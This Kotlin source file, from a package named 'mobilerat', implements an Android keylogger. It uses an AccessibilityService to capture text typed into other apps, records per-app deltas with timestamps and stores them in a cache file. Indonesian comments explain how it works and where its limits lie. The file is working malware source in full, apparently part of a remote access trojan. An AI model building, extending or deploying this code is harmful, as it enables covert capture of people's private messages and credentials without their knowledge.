package com.kai.mobilerat

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.Context
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Keylogger lewat AccessibilityService. Ini satu-satunya jalur resmi di
 * Android untuk membaca ketikan aplikasi lain; tanpa root, tanpa Xposed, dan
 * tanpa hook native — OS sendiri yang mengirim event teks ke sini.
 *
 * Batasnya nyata dan harus diketahui:
 *  - pemilik perangkat harus mengaktifkannya di Settings > Accessibility
 *  - hanya kolom teks yang diekspos aplikasi (password field biasanya
 *    menandai dirinya `password` dan isinya tidak dikirim)
 *  - satu event = isi kolom penuh, bukan satu tombol; karena itu yang dicatat
 *    hanya selisihnya terhadap isi terakhir per aplikasi
 */
class KeylogService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        enabled = true
    }

    override fun onInterrupt() {
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!enabled || event == null) return
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        val text = buildString {
            for (i in 0 until event.text.size) append(event.text[i] ?: "")
        }
        if (text.isEmpty()) return

        val delta = synchronized(last) {
            val prev = last[pkg] ?: ""
            last[pkg] = text
            when {
                text == prev -> ""
                text.startsWith(prev) -> text.substring(prev.length)
                else -> " [$text]"
            }
        }
        if (delta.isEmpty()) return
        append(this, "$pkg: $delta")
    }

    companion object {

        private const val MAX = 200_000

        @Volatile
        var enabled = true

        private val last = HashMap<String, String>()

        fun file(ctx: Context): File = File(ctx.cacheDir, "keylog.txt")

        fun append(ctx: Context, line: String) {
            try {
                val f = file(ctx)
                if (f.length() > MAX) f.delete()
                val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                f.appendText("$ts $line\n")
            } catch (_: Exception) {
            }
        }

        fun clear(ctx: Context) {
            try {
                file(ctx).delete()
            } catch (_: Exception) {
            }
            synchronized(last) { last.clear() }
        }

        /** Apakah service ini sudah diaktifkan pemilik perangkat di Settings. */
        fun isEnabled(ctx: Context): Boolean {
            val flat = ComponentName(ctx, KeylogService::class.java).flattenToString()
            val short = ComponentName(ctx, KeylogService::class.java).flattenToShortString()
            val list = try {
                Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
            } catch (_: Exception) {
                null
            } ?: return false
            return list.split(':').any { it.equals(flat, true) || it.equals(short, true) }
        }
    }
}
